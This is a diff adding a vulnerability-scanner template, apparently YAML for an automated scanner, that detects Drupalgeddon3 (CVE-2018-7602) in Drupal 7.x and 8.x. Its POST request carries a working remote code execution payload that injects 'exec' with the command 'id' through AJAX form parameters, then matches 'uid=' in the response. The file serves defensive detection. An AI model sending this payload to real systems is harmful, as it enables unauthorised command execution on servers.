@@ -1,0 +1,16 @@
+name: Drupalgeddon3 CVE-2018-7602 Detection
+description: Probes for the Drupalgeddon3 remote code execution vulnerability (CVE-2018-7602), a follow-on to CVE-2018-7600. This variant requires authentication but affects Drupal 7.x and 8.x with AJAX form processing.
+severity: critical
+cwe: CWE-74
+
+requests:
+  - method: POST
+    path: /node/1/delete?element_parents=actions/subform/field_media/%23value&ajax_form=1&_wrapper_format=drupal_ajax
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "form_id=node_1_delete_form&_drupal_ajax=1&field_media[#post_render][]=exec&field_media[#type]=markup&field_media[#markup]=id"
+
+matchers:
+  - body_contains: "uid="
+  - regex: "uid=[0-9]+\\(.*\\)"
+  - status_code: 200
